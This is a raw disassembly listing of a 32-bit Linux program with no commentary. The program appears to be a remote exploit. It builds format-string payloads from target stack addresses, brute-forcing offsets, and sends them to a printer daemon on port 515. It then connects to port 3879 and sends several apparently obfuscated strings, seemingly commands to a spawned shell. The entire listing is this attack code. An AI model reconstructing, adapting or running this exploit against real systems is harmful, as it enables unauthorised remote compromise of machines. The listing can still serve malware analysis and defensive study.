xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push fcn.0804976c
push fcn.08048664
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
jmp dword [reloc.usleep]
jmp dword [reloc.__register_frame_info]
jmp dword [reloc.write]
jmp dword [reloc.close]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.getopt]
jmp dword [reloc.fgets]
jmp dword [reloc.strlen]
jmp dword [reloc.strncmp]
jmp dword [reloc.strcat]
jmp dword [reloc.snprintf]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.bzero]
jmp dword [reloc.exit]
jmp dword [reloc.atoi]
jmp dword [reloc.send]
jmp dword [reloc.htons]
jmp dword [reloc.strtoul]
jmp dword [reloc.memset]
jmp dword [reloc.connect]
jmp dword [reloc.strncpy]
jmp dword [reloc.fopen]
jmp dword [reloc.sprintf]
jmp dword [reloc.socket]
jmp dword [reloc.herror]
jmp dword [0x804acc8]
push ebp
mov ebp, esp
sub esp, 0x40c
push esi
push ebx
mov dword [s2], 0
mov dword [var_40ch], 0
push 0x804a960
call fcn.08048910
add esp, 4
push 0x804a974
call fcn.08048910
add esp, 4
push 0x804a986
call fcn.08048910
add esp, 4
call fcn.08048958
cmp dword [argc], 2
jg 0x8049380
mov eax, dword [argv]
mov edx, dword [eax]
push edx
call fcn.08049308
add esp, 4
mov eax, 1
jmp 0x8049731
lea esi, [esi]
mov eax, dword [argv]
add eax, 4
mov edx, dword [eax]
mov dword [0x804aa74], edx
push 5
push 0x80498ac
mov eax, dword [argv]
add eax, 8
mov edx, dword [eax]
push edx
call sym.imp.strncmp
add esp, 0xc
mov eax, eax
test eax, eax
jne 0x80493b6
mov dword [0x804aa7c], 1
nop
push 0x80498b2
mov eax, dword [argv]
push eax
mov eax, dword [argc]
push eax
call sym.imp.getopt
add esp, 0xc
mov eax, eax
mov dword [var_408h], eax
cmp dword [var_408h], 0xffffffff
jne 0x80493e2
jmp 0x8049550
mov eax, dword [var_408h]
add eax, 0xffffff9f
cmp eax, 0x16
ja case.0x80493fb.98
mov eax, dword [eax*4 + 0x80498d4]
jmp eax
lea esi, [esi]
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov dword [0x804aa78], eax
jmp 0x8049548
lea esi, [esi]
push 0x10
push 0
mov eax, dword [obj.optarg]
push eax
call sym.imp.strtoul
add esp, 0xc
mov eax, eax
mov ecx, dword [0x804aa78]
mov edx, ecx
add edx, edx
add edx, ecx
lea ecx, [edx*8]
mov edx, 0x804aa30
mov dword [ecx + edx], eax
jmp 0x8049548
push 0x10
push 0
mov eax, dword [obj.optarg]
push eax
call sym.imp.strtoul
add esp, 0xc
mov eax, eax
mov ecx, dword [0x804aa78]
mov edx, ecx
add edx, edx
add edx, ecx
lea ecx, [edx*8]
mov edx, 0x804aa34
mov dword [ecx + edx], eax
jmp 0x8049548
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov ecx, dword [0x804aa78]
mov edx, ecx
add edx, edx
add edx, ecx
lea ecx, [edx*8]
mov edx, 0x804aa40
mov dword [ecx + edx], eax
jmp 0x8049548
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov dword [0x804b6a0], eax
jmp 0x8049548
nop
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov ecx, dword [0x804aa78]
mov edx, ecx
add edx, edx
add edx, ecx
lea ecx, [edx*8]
mov edx, 0x804aa38
mov dword [ecx + edx], eax
jmp 0x8049548
lea esi, [esi]
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov ecx, dword [0x804aa78]
mov edx, ecx
add edx, edx
add edx, ecx
lea ecx, [edx*8]
mov edx, 0x804aa3c
mov dword [ecx + edx], eax
jmp 0x8049548
lea esi, [esi]
mov eax, dword [argv]
mov edx, dword [eax]
push edx
call fcn.08049308
add esp, 4
mov eax, 1
jmp 0x8049731
jmp 0x80493b7
lea esi, [esi]
cmp dword [0x804aa78], 0
jge 0x8049563
mov eax, 0xffffffff
jmp 0x8049731
mov eax, dword [0x804aa74]
push eax
call sym.imp.gethostbyname
add esp, 4
mov eax, eax
mov dword [0x804b6a4], eax
cmp dword [0x804b6a4], 0
jne 0x8049598
push 0x80498c2
call sym.imp.herror
add esp, 4
push 1
call sym.imp.exit
add esp, 4
mov eax, dword [0x804aa78]
mov edx, eax
add edx, edx
add edx, eax
lea eax, [edx*8]
mov edx, 0x804aa34
mov ebx, dword [0x804aa78]
mov ecx, ebx
add ecx, ecx
add ecx, ebx
lea ebx, [ecx*8]
mov ecx, 0x804aa30
mov esi, dword [ebx + ecx]
add esi, 0x406
mov dword [eax + edx], esi
cmp dword [0x804aa7c], 0
jle 0x80496d0
mov edx, dword [0x804aa78]
mov eax, edx
add eax, eax
add eax, edx
lea edx, [eax*8]
mov eax, 0x804aa30
mov dword [edx + eax], 0xbffffff0
nop
cmp dword [0x804aa80], 0
jne 0x8049610
jmp 0x80496c7
mov esi, esi
push 0x400
push 0
lea eax, [dest]
push eax
call sym.imp.memset
add esp, 0xc
call fcn.08048dbc
mov eax, eax
mov dword [s2], eax
push 0x804b220
lea eax, [dest]
push eax
call sym.imp.strcpy
add esp, 8
mov eax, dword [s2]
push eax
lea eax, [dest]
push eax
call sym.imp.strcat
add esp, 8
push 0x80498d0
lea eax, [dest]
push eax
call sym.imp.strcat
add esp, 8
lea eax, [dest]
push eax
call fcn.08049240
add esp, 4
mov edx, dword [0x804aa78]
mov eax, edx
add eax, eax
add eax, edx
lea edx, [eax*8]
mov eax, 0x804aa30
mov ecx, 0xbffffff0
mov esi, ecx
sub esi, dword [0x804b6a0]
mov dword [edx + eax], esi
add dword [0x804b6a0], 4
cmp dword [0x804b6a0], 0x1388
jle 0x80496c2
mov eax, 0xffffffff
jmp 0x8049731
jmp 0x8049600
jmp 0x80496dd
lea esi, [esi]
call fcn.08048dbc
mov eax, eax
mov dword [s2], eax
push 0x804b220
lea eax, [dest]
push eax
call sym.imp.strcpy
add esp, 8
mov eax, dword [s2]
push eax
lea eax, [dest]
push eax
call sym.imp.strcat
add esp, 8
push 0x80498d0
lea eax, [dest]
push eax
call sym.imp.strcat
add esp, 8
lea eax, [dest]
push eax
call fcn.08049240
add esp, 4
mov eax, 0xffffffff
jmp 0x8049731
lea esp, [var_414h]
pop ebx
pop esi
leave
ret
pop ebx
add ebx, 0x25e7
cmp dword [ebx + 0x78], 0
je 0x8048682
call loc.imp.__gmon_start__
mov esi, esi
call fcn.080488e0
call fcn.08049740
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x80488fb
push 0x804ad84
push 0x804ac40
call sym.imp.__register_frame_info
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, 0x804ac44
cmp dword [0x804ac44], 0xffffffff
je 0x804975e
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8049752
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x2c
push esi
push ebx
mov dword [var_8h], 0
mov eax, dword [arg_10h]
mov dword [var_ch], eax
mov esi, dword [arg_ch]
and esi, 0xff
mov dword [var_2ch], esi
mov eax, dword [arg_ch]
and eax, 0xff00
mov esi, eax
shr esi, 8
mov dword [var_28h], esi
mov eax, dword [arg_ch]
and eax, 0xff0000
mov esi, eax
shr esi, 0x10
mov dword [var_24h], esi
mov eax, dword [arg_ch]
and eax, 0xff000000
mov esi, eax
shr esi, 0x18
mov dword [var_20h], esi
mov eax, dword [var_2ch]
mov dword [var_1ch], eax
mov eax, dword [var_28h]
mov dword [var_18h], eax
mov eax, dword [var_24h]
mov dword [var_14h], eax
mov eax, dword [var_20h]
mov dword [var_10h], eax
push 0x25
push 0
push 0x804b220
call sym.imp.memset
add esp, 0xc
push 0x35
push 0
push 0x804b260
call sym.imp.memset
add esp, 0xc
mov dword [var_4h], 0
cmp dword [var_4h], 3
jle 0x8048a80
jmp 0x8048d80
lea esi, [esi]
cmp dword [var_ch], 0x100
ja 0x8048a90
jmp 0x8048aa0
nop
lea esi, [esi]
add dword [var_ch], 0xffffff00
jmp 0x8048a80
lea esi, [esi]
cmp dword [var_4h], 0
jle 0x8048b00
mov edx, dword [var_4h]
dec edx
lea eax, [edx*4]
lea edx, [var_1ch]
mov ecx, dword [var_4h]
mov ebx, ecx
lea ecx, [ebx*4]
lea ebx, [var_1ch]
mov eax, dword [eax + edx]
cmp eax, dword [ecx + ebx]
jne 0x8048b00
mov eax, dword [arg_14h]
mov edx, dword [var_4h]
add eax, edx
push eax
push 0x80497fb
push 0x804b260
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b260
push edx
call sym.imp.sprintf
add esp, 0xc
jmp 0x8048cf7
mov esi, esi
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov ecx, dword [var_ch]
cmp ecx, dword [eax + edx]
jae 0x8048c60
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov eax, dword [eax + edx]
mov edx, dword [var_ch]
sub eax, edx
cmp eax, 0xa
ja 0x8048bd0
push 0x8049802
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov eax, dword [eax + edx]
mov edx, dword [var_ch]
sub eax, edx
push eax
push 0x804980f
push 0x804b260
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b260
push edx
call sym.imp.sprintf
add esp, 0x10
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov eax, dword [eax + edx]
mov edx, dword [var_ch]
sub eax, edx
add dword [var_ch], eax
mov eax, dword [arg_14h]
mov edx, dword [var_4h]
add eax, edx
push eax
push 0x80497fb
push 0x804b260
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b260
push edx
call sym.imp.sprintf
add esp, 0xc
jmp 0x8048c55
lea esi, [esi]
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov eax, dword [eax + edx]
mov edx, dword [var_ch]
sub eax, edx
push eax
push 0x8049814
push 0x804b260
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b260
push edx
call sym.imp.sprintf
add esp, 0xc
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov eax, dword [eax + edx]
mov edx, dword [var_ch]
sub eax, edx
add dword [var_ch], eax
mov eax, dword [arg_14h]
mov edx, dword [var_4h]
add eax, edx
push eax
push 0x80497fb
push 0x804b260
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b260
push edx
call sym.imp.sprintf
add esp, 0xc
jmp 0x8048cf7
lea esi, [esi]
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov ecx, dword [var_ch]
add ecx, 0xffffff00
mov esi, dword [eax + edx]
sub esi, ecx
mov dword [var_8h], esi
mov eax, dword [var_8h]
push eax
push 0x8049814
push 0x804b260
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b260
push edx
call sym.imp.sprintf
add esp, 0xc
mov eax, dword [var_4h]
mov edx, eax
lea eax, [edx*4]
lea edx, [var_1ch]
mov ecx, dword [var_ch]
add ecx, 0xffffff00
mov eax, dword [eax + edx]
sub eax, ecx
add dword [var_ch], eax
mov eax, dword [arg_14h]
mov edx, dword [var_4h]
add eax, edx
push eax
push 0x80497fb
push 0x804b260
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b260
push edx
call sym.imp.sprintf
add esp, 0xc
mov eax, dword [arg_8h]
mov edx, dword [var_4h]
add eax, edx
mov edx, eax
and edx, 0xff000000
mov eax, edx
shr eax, 0x18
movzx edx, al
push edx
mov eax, dword [arg_8h]
mov edx, dword [var_4h]
add eax, edx
mov edx, eax
and edx, 0xff0000
mov eax, edx
shr eax, 0x10
movzx edx, al
push edx
mov eax, dword [arg_8h]
mov edx, dword [var_4h]
add eax, edx
mov edx, eax
and edx, 0xff00
mov eax, edx
shr eax, 8
movzx edx, al
push edx
mov al, byte [arg_8h]
mov dl, byte [var_4h]
add al, dl
movzx edx, al
push edx
push 0x804981b
push 0x804b220
call sym.imp.strlen
add esp, 4
mov eax, eax
mov edx, eax
add edx, 0x804b220
push edx
call sym.imp.sprintf
add esp, 0x18
inc dword [var_4h]
jmp 0x8048a72
nop
lea esi, [esi]
nop
push 0x804b220
call sym.imp.strlen
add esp, 4
mov eax, eax
cmp eax, 0x23
jbe 0x8048d97
jmp 0x8048db0
push 0x8049824
push 0x804b220
call sym.imp.strcat
add esp, 8
jmp 0x8048d81
nop
lea esi, [esi]
jmp 0x8048db2
lea esp, [var_34h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x4a8
push edi
push ebx
push 0x804b6b0
push 0x8049840
push 0x804afa0
call sym.imp.sprintf
add esp, 0xc
push 0x804a960
push 0x804a974
mov eax, dword [0x804aa74]
mov dword [length], eax
mov ecx, dword [length]
push ecx
push 0x8049880
push 0x804b0e0
call sym.imp.sprintf
add esp, 0x14
mov word [var_18h], 2
push 0xf27
call sym.imp.htons
add esp, 4
mov word [length], ax
mov edi, dword [length]
mov word [var_16h], di
mov eax, dword [0x804b6a4]
mov dword [length], eax
mov ecx, dword [length]
mov edx, dword [ecx + 0x10]
mov edi, dword [edx]
mov dword [length], edi
mov eax, dword [length]
mov edx, dword [eax]
mov dword [var_14h], edx
push 0
push 1
push 2
call sym.imp.socket
add esp, 0xc
mov dword [length], eax
mov ecx, dword [length]
mov dword [var_4h], ecx
cmp dword [var_4h], 0
jge 0x8049010
mov eax, 0xffffffff
jmp 0x8049236
push 0x10
lea edx, [var_18h]
mov dword [length], edx
mov edi, dword [length]
push edi
mov eax, dword [var_4h]
mov dword [length], eax
mov ecx, dword [length]
push ecx
call sym.imp.connect
add esp, 0xc
mov dword [length], eax
cmp dword [length], 0
jge 0x8049053
mov eax, 0xffffffff
jmp 0x8049236
mov dword [0x804aa80], 0xffffffff
lea esi, [esi]
lea edi, [var_98h]
mov dword [length], edi
mov ecx, 0x20
mov edi, dword [length]
xor eax, eax
cld
rep stosd dword es:[edi], eax
mov dword [var_49ch], ecx
mov dword [var_4a0h], edi
jmp 0x8049092
lea esi, [esi]
jmp 0x8049060
mov eax, dword [var_4h]
mov dword [length], eax
mov edx, dword [length]
shr edx, 5
lea ecx, [edx*4]
mov dword [length], ecx
lea edx, [var_98h]
mov edi, dword [var_4h]
mov dword [var_4a8h], edi
mov ebx, dword [var_4a8h]
and ebx, 0x1f
mov eax, dword [length]
bts dword [eax + edx], ebx
push 0
push 0x804aaa0
call sym.imp.strlen
add esp, 4
mov dword [length], eax
mov ecx, dword [length]
push ecx
push 0x804aaa0
mov edi, dword [var_4h]
mov dword [length], edi
mov eax, dword [length]
push eax
call sym.imp.send
add esp, 0x10
push 0
push 0x804aac8
call sym.imp.strlen
add esp, 4
mov dword [length], eax
mov ecx, dword [length]
push ecx
push 0x804aac8
mov edi, dword [var_4h]
mov dword [length], edi
mov eax, dword [length]
push eax
call sym.imp.send
add esp, 0x10
push 0
push 0x804afa0
call sym.imp.strlen
add esp, 4
mov dword [length], eax
mov ecx, dword [length]
push ecx
push 0x804afa0
mov edi, dword [var_4h]
mov dword [length], edi
mov eax, dword [length]
push eax
call sym.imp.send
add esp, 0x10
push 0
push 0x804aadb
call sym.imp.strlen
add esp, 4
mov dword [length], eax
mov ecx, dword [length]
push ecx
push 0x804aadb
mov edi, dword [var_4h]
mov dword [length], edi
mov eax, dword [length]
push eax
call sym.imp.send
add esp, 0x10
push 0
push 0x804ab00
call sym.imp.strlen
add esp, 4
mov dword [length], eax
mov ecx, dword [length]
push ecx
push 0x804ab00
mov edi, dword [var_4h]
mov dword [length], edi
mov eax, dword [length]
push eax
call sym.imp.send
add esp, 0x10
push 0
push 0x804b0e0
call sym.imp.strlen
add esp, 4
mov dword [length], eax
mov ecx, dword [length]
push ecx
push 0x804b0e0
mov edi, dword [var_4h]
mov dword [length], edi
mov eax, dword [length]
push eax
call sym.imp.send
add esp, 0x10
push 0x7270e00
call sym.imp.usleep
add esp, 4
lea esp, [var_4b0h]
pop ebx
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push ebx
mov dword [var_4h], 0
mov esi, esi
mov eax, dword [arg_8h]
mov edx, dword [var_4h]
add eax, edx
cmp byte [eax], 0
jne 0x8048930
jmp 0x8048950
nop
mov eax, dword [arg_8h]
mov edx, dword [var_4h]
add eax, edx
mov edx, dword [arg_8h]
mov ecx, dword [var_4h]
add edx, ecx
mov bl, byte [edx]
inc bl
mov byte [eax], bl
inc dword [var_4h]
jmp 0x8048920
nop
lea esi, [esi]
mov ebx, dword [var_8h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push 0x10
lea eax, [src]
push eax
call sym.imp.bzero
add esp, 8
push 0x80497c0
push 0x80497c2
call sym.imp.fopen
add esp, 8
mov eax, eax
mov dword [stream], eax
mov eax, dword [stream]
push eax
push 0x10
lea eax, [src]
push eax
call sym.imp.fgets
add esp, 0xc
lea eax, [src]
push eax
push 0x804b6b0
call sym.imp.strcpy
add esp, 8
push 0x804b6b0
call sym.imp.strlen
add esp, 4
mov eax, eax
lea edx, [eax - 1]
mov eax, 0x804b6b0
cmp byte [edx + eax], 0xa
jne 0x80489de
push 0x804b6b0
call sym.imp.strlen
add esp, 4
mov eax, eax
lea edx, [eax - 1]
mov eax, 0x804b6b0
mov byte [edx + eax], 0
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
push esi
push ebx
push 0x1f9
push 0
push 0x804ada0
call sym.imp.memset
add esp, 0xc
mov eax, dword [0x804aa78]
mov edx, eax
add edx, edx
add edx, eax
lea eax, [edx*8]
mov edx, 0x804aa34
mov ebx, dword [0x804aa78]
mov ecx, ebx
add ecx, ecx
add ecx, ebx
lea ebx, [ecx*8]
mov ecx, 0x804aa30
mov esi, dword [ebx + ecx]
add esi, 0x406
mov dword [eax + edx], esi
mov edx, dword [0x804aa78]
mov eax, edx
add eax, eax
add eax, edx
lea edx, [eax*8]
mov eax, 0x804aa30
mov edx, dword [edx + eax]
mov dword [var_4h], edx
mov edx, dword [0x804aa78]
mov eax, edx
add eax, eax
add eax, edx
lea edx, [eax*8]
mov eax, 0x804aa34
mov edx, dword [edx + eax]
mov dword [var_8h], edx
mov edx, dword [0x804aa78]
mov eax, edx
add eax, eax
add eax, edx
lea edx, [eax*8]
mov eax, 0x804aa38
mov edx, dword [edx + eax]
push edx
mov edx, dword [0x804aa78]
mov eax, edx
add eax, eax
add eax, edx
lea edx, [eax*8]
mov eax, 0x804aa3c
mov edx, dword [edx + eax]
push edx
mov eax, dword [var_8h]
push eax
mov eax, dword [var_4h]
push eax
call fcn.080489e0
add esp, 0x10
push 0x804b220
push 0x8049826
mov edx, dword [0x804aa78]
mov eax, edx
add eax, eax
add eax, edx
lea edx, [eax*8]
mov eax, 0x804aa40
mov edx, dword [edx + eax]
push edx
push 0x804982b
push 0x1f8
push 0x804ada0
call sym.imp.snprintf
add esp, 0x18
push 0x24
push 0x804ada0
push 0x804b220
call sym.imp.strncpy
add esp, 0xc
push 0x1f8
push 0x804b260
push 0x804ada0
call sym.imp.strncpy
add esp, 0xc
mov dword [var_ch], 0
cmp dword [var_ch], 0xc7
jle 0x8048f11
jmp 0x8048f28
push 0x8049832
push 0x804ada0
call sym.imp.strcat
add esp, 8
inc dword [var_ch]
jmp 0x8048f06
push 0x804a9a0
push 0x804ada0
call sym.imp.strcat
add esp, 8
mov eax, 0x804ada0
jmp 0x8048f41
lea esp, [var_14h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x498
mov word [addr], 2
push 0x203
call sym.imp.htons
add esp, 4
mov eax, eax
mov word [var_16h], ax
mov eax, dword [0x804b6a4]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
mov edx, dword [eax]
mov dword [var_14h], edx
push 0
push 1
push 2
call sym.imp.socket
add esp, 0xc
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0
jge 0x8049294
push 0xffffffffffffffff
call sym.imp.exit
add esp, 4
push 0x10
lea edx, [addr]
mov eax, edx
push eax
mov eax, dword [fildes]
push eax
call sym.imp.connect
add esp, 0xc
mov eax, eax
test eax, eax
jge 0x80492b8
push 0xffffffffffffffff
call sym.imp.exit
add esp, 4
push 0xc350
call sym.imp.usleep
add esp, 4
mov eax, dword [ptr]
push eax
call sym.imp.strlen
add esp, 4
mov eax, eax
push eax
mov eax, dword [ptr]
push eax
mov eax, dword [fildes]
push eax
call sym.imp.write
add esp, 0xc
mov eax, eax
test eax, eax
jge 0x80492f4
push 2
call sym.imp.exit
add esp, 4
mov eax, dword [fildes]
push eax
call sym.imp.close
add esp, 4
call fcn.08048f48
leave
ret
pop ebx
add ebx, 0x14df
call fcn.08048890
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
cmp dword [0x804a948], 0
jne 0x80488d4
jmp 0x80488ad
mov esi, esi
lea edx, [eax + 4]
mov dword [0x804a944], edx
mov eax, dword [eax]
call eax
mov eax, dword [0x804a944]
cmp dword [eax], 0
jne 0x80488a0
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x80488ca
push 0x804ac40
call sym.imp.__deregister_frame_info
mov dword [0x804a948], 1
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.0804866d
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.08049775
